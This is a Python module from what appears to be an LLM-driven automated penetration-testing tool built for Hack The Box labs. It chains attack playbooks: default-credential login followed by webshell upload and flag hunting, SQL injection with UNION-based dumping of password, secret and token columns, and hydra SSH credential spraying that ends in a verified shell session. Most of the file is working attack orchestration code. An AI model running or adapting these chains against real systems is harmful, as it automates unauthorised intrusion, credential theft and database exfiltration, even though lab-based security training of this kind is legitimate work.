"""StrikeARC v9 — Playbook engine (goal-directed chains over primitives).

A Playbook is a declared chain: ordered steps over tools/primitives.py,
each with an explicit success criterion, ending in either a verified
foothold (session) or a structured failure. The LLM never writes
commands; it picks which playbook fires next (docs/V9_DESIGN.md §4).

Every run appends a PlaybookResult to state["playbook_runs"] —
memoization keys on (playbook.name, target_key).
"""

from __future__ import annotations

import json
import re
import secrets
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from tools import primitives as P

FLAG_RE = re.compile(r"HTB\{[^}\s]{4,80}\}")


def _log(msg: str) -> None:
    print(f"  [PLAYBOOK] {msg}")


@dataclass
class PlaybookResult:
    playbook: str
    target_key: str
    status: str            # "foothold" | "flag" | "failed" | "skipped"
    steps_log: List[str] = field(default_factory=list)
    flags: List[str] = field(default_factory=list)
    credentials: List[Dict] = field(default_factory=list)
    session: Optional[Dict] = None      # verified session dict
    notes: str = ""

    def step(self, msg: str) -> None:
        self.steps_log.append(f"{time.strftime('%H:%M:%S')} {msg}")
        _log(f"[{self.playbook}] {msg}")


@dataclass
class Playbook:
    name: str
    vault_ref: str
    description: str
    triggers: List[str]   # keyword match against vector_type/evidence

    def matches(self, vector: Dict) -> bool:
        # v9.2 (run-21 lesson): CVE vectors describe VERSIONS, not creds.
        # 'openssh 8.9' in a CVE title substring-matched the 'ssh' trigger
        # and mis-dispatched known_cve vectors to hydra sprays. CVE
        # exploitation belongs to the v8 executor; playbooks never claim it.
        if str(vector.get("vector_type", "")).lower() in (
            "known_cve", "cve", "version_cve",
        ):
            return False
        hay = " ".join(
            str(vector.get(k, ""))
            for k in ("vector_type", "title", "description", "evidence", "target")
        ).lower()
        return any(t in hay for t in self.triggers)

    def run(self, state: Dict, target: str) -> PlaybookResult:
        raise NotImplementedError


# ─── helpers ──────────────────────────────────────────────────────────


def extract_ip(target: str) -> Optional[str]:
    """Robust IP extraction from any LLM target string (run-19 lesson:
    '10.129.229.147 (all auth surfaces) / ...' became the host_ip)."""
    m = re.search(r"\b((?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", target or "")
    return m.group(1) if m else None


def extract_url(target: str) -> Optional[str]:
    m = re.search(r"https?://[^\s,)\"]+", target or "")
    return m.group(0).rstrip(".,;") if m else None


def extract_vhost(target: str) -> Optional[str]:
    """Pull a vhost hostname from a target string like
    'status.inlanefreight.local search SQLi (10.129.229.147)'."""
    # longest-match-first: 'status.inlanefreight.local' must win over
    # the zone apex 'inlanefreight.local' (mock-test lesson)
    for m in re.finditer(r"\b((?:[a-z0-9-]+\.)+(?:local|htb|lan|internal))\b", target or "", re.I):
        return m.group(1).lower()
    return None


def vhost_urls_from_state(state: Dict, ip: Optional[str]) -> List[str]:
    """Candidate search-form URLs for a host: the IP on every web port,
    plus each discovered vhost routed via Host header on port 80."""
    urls: List[str] = []
    hosts = state.get("hosts", {})
    if ip and ip in hosts:
        for port in (80, 8080, 443):
            urls.append(f"http://{ip}:{port}/")
    # vhosts discovered during enumeration live on host['vhosts'] (dicts with
    # 'name') and in findings like '[+] Vhost: status.inlanefreight.local'
    if ip and ip in hosts:
        for vh in (hosts[ip].get("vhosts") or []):
            name = vh.get("name") if isinstance(vh, dict) else vh
            if name:
                urls.append(f"http://{ip or ''}/  {name}".strip())
    for f in _findings_texts(state):
        for m in re.finditer(r"Vhost:\s*([a-z0-9.-]+)", f, re.I):
            urls.append(f"http://{ip or ''}/  {m.group(1)}".strip())
    return urls


def _findings_texts(state: Dict) -> List[str]:
    out: List[str] = []
    for host in state.get("hosts", {}).values():
        fnd = host.get("findings") or []
        for f in fnd:
            out.append(f if isinstance(f, str) else json.dumps(f))
    # LLM strategy evidence sometimes carries them too
    for ap in state.get("attack_paths", []) or []:
        for ev in ap.get("evidence", []) if isinstance(ap.get("evidence"), list) else []:
            out.append(str(ev))
    return out


def extract_base(url: str) -> Optional[str]:
    """Scheme://host[:port] only — strip any path (a /ticket.php in the
    vector target must not become part of the base)."""
    try:
        from urllib.parse import urlparse

        p = urlparse(url)
        if not p.netloc:
            return None
        return f"{p.scheme}://{p.netloc}"
    except Exception:
        return None


def _ip_or_none(result: PlaybookResult, target: str, fallback_state_ip: Optional[str] = None) -> Optional[str]:
    ip = extract_ip(target) or fallback_state_ip
    if not ip:
        result.step(f"no IP extractable from target {target!r}")
    return ip


def mine_flags(text: str) -> List[str]:
    return sorted(set(FLAG_RE.findall(text or "")))


def _mine_creds_from_rows(rows: List[Dict]) -> List[Dict]:
    creds = []
    for r in rows:
        u = r.get("username") or r.get("user") or r.get("login") or r.get("email")
        p = r.get("password") or r.get("pass") or r.get("passwd")
        if u and p and not str(p).startswith("*"):
            creds.append({"username": str(u), "password": str(p), "source": "sqlmap dump"})
    return creds


def _session_dict(transport, host_ip: str, kind: str, detail: Dict) -> Dict:
    return {
        "id": f"sess_{secrets.token_hex(5)}",
        "host_ip": host_ip,
        "transport_type": kind,
        "transport": transport,          # live object (not serialized)
        "transport_config": detail,
        "verified": True,
        "privilege": "user",
        "established_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
    }


# ─── Playbook 1: web app → upload → verified webshell ────────────────


class WebAppShellPlaybook(Playbook):
    """http_login → upload → nonce-verified shell → hunt through it.

    Vault: HTB File Upload / Command Injection modules.
    """

    def run(self, state: Dict, target: str) -> PlaybookResult:
        res = PlaybookResult("web_app_shell", target, "running")
        url = extract_url(target) or self._url_from_state(state, target)
        ip = extract_ip(target) or self._ip_from_state(state)
        if not url or not ip:
            res.status = "skipped"
            res.step("no URL/IP derivable from target")
            return res
        base = extract_base(url) or url.rstrip("/")
        res.step(f"target {base} ({ip})")

        # 1. Login with creds found in state (admin:admin class)
        creds = self._pick_creds(state)
        sess = None
        for user, pw in creds:
            res.step(f"http_login admin panel as {user}")
            sess = P.http_login(
                base, "login.php",
                {"username": user, "password": pw},
                success_marker="admin", fail_marker="Login",
            )
            if sess:
                res.credentials.append({"username": user, "password": pw, "source": "http_login"})
                break
        if sess is None:
            res.status = "failed"
            res.step("login failed on all candidate creds")
            return res

        # 2. Upload the nonce-embedded shell
        res.step("uploading webshell via ticket upload")
        shell_url = P.upload_file(sess, "ticket.php", "file", b"", name="shell.php")
        if not shell_url:
            res.status = "failed"
            res.step("upload or shell verification failed")
            return res

        # 3. Verified session + hunt
        transport = P.build_webshell_session(shell_url)
        if transport is None:
            res.status = "failed"
            res.step("nonce verification failed")
            return res
        res.session = _session_dict(transport, ip, "webshell", {"url": shell_url, "param": "c"})
        res.status = "foothold"
        res.step(f"VERIFIED foothold: {shell_url}")

        # 4. Last-mile hunt through the transport
        from tools.flag_hunter import hunt_linux_flags
        flags = hunt_linux_flags(transport=transport)
        res.flags = [f["flag_value"] for f in flags]
        if res.flags:
            res.status = "flag"
        return res

    def _pick_creds(self, state: Dict):
        pairs = []
        for c in state.get("discovered_credentials", []):
            if c.get("password"):
                pairs.append((c.get("username", "admin"), c["password"]))
        if not pairs:
            pairs = [("admin", "admin")]  # default-cred class fallback
        return pairs[:5]

    def _url_from_state(self, state: Dict, target: str) -> Optional[str]:
        ip = extract_ip(target) or self._ip_from_state(state)
        if not ip:
            return None
        for port in (8080, 80):
            if self._port_open(ip, port):
                return f"http://{ip}:{port}"
        return f"http://{ip}"

    def _ip_from_state(self, state: Dict) -> Optional[str]:
        hosts = state.get("hosts", {})
        return next(iter(hosts.keys()), None)

    def _port_open(self, ip: str, port: int) -> bool:
        import socket

        try:
            with socket.create_connection((ip, port), timeout=3):
                return True
        except OSError:
            return False


# ─── Playbook 2: SQLi chain (authenticated dump) ─────────────────────


class SQLiChainPlaybook(Playbook):
    """login → sqli_test → authenticated sqli_dump → mine flags/creds.

    Vault: HTB SQL Injection Fundamentals.
    """

    def run(self, state: Dict, target: str) -> PlaybookResult:
        res = PlaybookResult("sqli_chain", target, "running")
        url = extract_url(target)
        if not url:
            res.status = "skipped"
            res.step("no URL in target")
            return res
        base = extract_base(url) or url.split("/login.php")[0].split("/ticket.php")[0].rstrip("/")
        res.step(f"base {base}")

        # 1. Login first (v8.3.4 lesson — sqlmap must run authenticated)
        creds = self._pick_creds(state)
        sess = None
        user = None
        for user, pw in creds:
            sess = P.http_login(base, "login.php", {"username": user, "password": pw},
                                success_marker="admin", fail_marker="Login")
            if sess:
                break
        if sess is None:
            res.step("login failed — trying anonymous sqli probe")
        else:
            res.step(f"authenticated as {user}")

        # 2. Quick boolean probe on ticket.php param
        if not P.sqli_test(base, "ticket.php", {"id": "1"}, session=sess):
            res.step("no injection signal on ticket.php?id — trying search-form UNION")
            return self._search_form_union(res, state, target, url)
        return self._dump_ticket(res, base, sess)

        return self._dump_ticket(res, base, sess)

    def _dump_ticket(self, res: PlaybookResult, base: str, sess) -> PlaybookResult:
        # 3. Full authenticated dump
        rows = P.sqli_dump(base, "ticket.php", {"id": "1"}, session=sess)
        if not rows:
            res.status = "failed"
            res.step("dump returned no rows")
            return res
        res.step(f"dumped {len(rows)} row(s)")
        creds_found = _mine_creds_from_rows(rows)
        res.credentials.extend(creds_found)

        # 4. Mine flags from dump
        flags = mine_flags(" ".join(str(v) for r in rows for v in r.values()))
        res.flags = flags
        res.status = "flag" if flags else "foothold-less data"
        if not flags:
            res.status = "failed" if not creds_found else "creds"
        return res

    def _search_form_union(self, res: PlaybookResult, state: Dict,
                          target: str, url: str) -> PlaybookResult:
        """v9.1: anonymous UNION SQLi in search forms (run-20 status-vhost
        chain). Tries the vector URL first, then every vhost on the box."""
        ip = extract_ip(target)
        vhost = extract_vhost(target)
        candidates: List[tuple] = [(url.rstrip("/") + "/", None, "searchitem")]
        if vhost:
            candidates = [(url.rstrip("/") + "/", vhost, "searchitem")]
        # vhost candidates from state findings
        vh_names = []
        for f in _findings_texts(state):
            for m in re.finditer(r"Vhost:\s*([a-z0-9.-]+)", f, re.I):
                vh_names.append(m.group(1))
        for vh in dict.fromkeys(vh_names):
            candidates.append((f"http://{ip or 'TARGET_IP'}/", vh, "searchitem"))
        seen = set()
        for u, vh, field in candidates:
            key = (vh or u)
            if key in seen or "TARGET_IP" in u:
                continue
            seen.add(key)
            res.step(f"probing search form {vh or u} ({field})")
            drv = P.union_sqli_search(u, field, vhost=vh)
            if drv is None:
                continue
            return self._union_dump(res, drv)
        res.status = "failed"
        res.step("no UNION SQLi in any search form")
        return res

    def _union_dump(self, res: PlaybookResult, drv) -> PlaybookResult:
        res.step("UNION SQLi confirmed — enumerating DB")
        vals: List[str] = []
        vals.append("db=" + (drv.query("database()") or "?"))
        vals.append("user=" + (drv.query("user()") or "?"))
        schemas = drv.rows("schema_name FROM information_schema.schemata")
        res.step(f"schemas: {', '.join(schemas[:8])}")
        # hunt interesting tables then their columns
        interesting = drv.rows(
            "concat(table_schema,'.',table_name) FROM information_schema.tables "
            "WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys')")
        res.step(f"{len(interesting)} interesting table(s)")
        for t in interesting[:12]:
            try:
                schema, table = t.split(".", 1)
                cols = drv.rows(
                    f"column_name FROM information_schema.columns "
                    f"WHERE table_schema='{schema}' AND table_name='{table}'")
                res.step(f"{t}: {', '.join(cols[:8])}")
                col_hay = " ".join(cols).lower()
                if any(k in col_hay for k in ("password", "passwd", "flag", "secret", "token")):
                    dump_cols = ",".join(f"coalesce({c},'')" for c in cols[:4])
                    rows = drv.rows(
                        f"concat_ws(0x7c,{dump_cols}) FROM {schema}.{table}")
                    col_names = cols[:4]
                    for v in rows:
                        parts = v.split("|")
                        rec = {c: p for c, p in zip(col_names, parts)}
                        mined = _mine_creds_from_rows([rec])
                        if mined:
                            for c in mined:
                                c["source"] = f"union sqli {schema}.{table}"
                            res.credentials.extend(mined)
                    for v in rows:
                        vals.append(f"{t}: {v[:120]}")
            except Exception as e:
                res.step(f"{t}: dump error {e.__class__.__name__}")
        text = "\n".join(vals)
        flags = mine_flags(text)
        res.flags = flags
        res.status = "flag" if flags else ("creds" if res.credentials else "foothold-less data")
        return res

    def _pick_creds(self, state: Dict):
        pairs = [(c.get("username", "admin"), c["password"])
                 for c in state.get("discovered_credentials", []) if c.get("password")]
        return pairs[:5] or [("admin", "admin")]


# ─── Playbook 3: cred → verified SSH ─────────────────────────────────


class CredSSHPlaybook(Playbook):
    """spray → ssh_connect → hunt → privesc loop (hunt after privesc).

    Vault: HTB Password Attacks 06/07.
    """

    def run(self, state: Dict, target: str) -> PlaybookResult:
        res = PlaybookResult("cred_ssh", target, "running")
        ip = extract_ip(target) or next(iter(state.get("hosts", {})), None)
        if ip and ip.endswith(".0"):
            # v9.2 (run-21 lesson): '10.129.145.0' is the network address,
            # not a host — extract_ip or hosts-dict fallback produced it.
            res.status = "skipped"
            res.step(f"network address {ip} is not sprayable")
            return res
        if not ip:
            res.status = "skipped"
            return res
        pairs = [(c.get("username", "admin"), c["password"])
                 for c in state.get("discovered_credentials", []) if c.get("password")]
        if not pairs:
            res.status = "skipped"
            res.step("no creds in state")
            return res
        # 1. Spray on SSH directly (fast subset)
        hits = P.spray_creds(ip, "ssh", pairs)
        if not hits:
            res.status = "failed"
            res.step(f"no valid SSH creds on {ip}")
            return res
        for h in hits:
            res.credentials.append({"username": h["login"], "password": h["password"], "source": "hydra ssh"})
            # 2. Verified SSH foothold
            t = P.ssh_connect(ip, h["login"], h["password"])
            if t:
                res.session = _session_dict(t, ip, "ssh_cred",
                                            {"username": h["login"], "password": h["password"], "port": 22})
                res.status = "foothold"
                # 3. Hunt through it
                from tools.flag_hunter import hunt_linux_flags
                flags = hunt_linux_flags(transport=t)
                res.flags = [f["flag_value"] for f in flags]
                if res.flags:
                    res.status = "flag"
                return res
        res.status = "failed"
        res.step("spray hits but no verified SSH transport")
        return res


# ─── Registry ─────────────────────────────────────────────────────────


def get_playbooks() -> List[Playbook]:
    return [
        SQLiChainPlaybook(
            "sqli_chain", "HTB SQL Injection Fundamentals",
            "login → inject → authenticated dump → mine",
            triggers=["sqli", "sql injection", "sqlmap", "ticket.php"],
        ),
        WebAppShellPlaybook(
            "web_app_shell", "HTB File Upload / Command Injection",
            "login → upload → verified webshell → hunt",
            triggers=["upload", "webshell", "rce", "file upload", "command injection"],
        ),
        CredSSHPlaybook(
            "cred_ssh", "HTB Password Attacks 06/07",
            "spray → verified ssh → hunt",
            triggers=["password_spray", "cred", "ssh", "reuse", "hydra"],
        ),
    ]


def playbook_for_vector(vector: Dict) -> Optional[Playbook]:
    """Keyword-bridge an old attack_path vector to a playbook."""
    for pb in get_playbooks():
        if pb.matches(vector):
            return pb
    return None
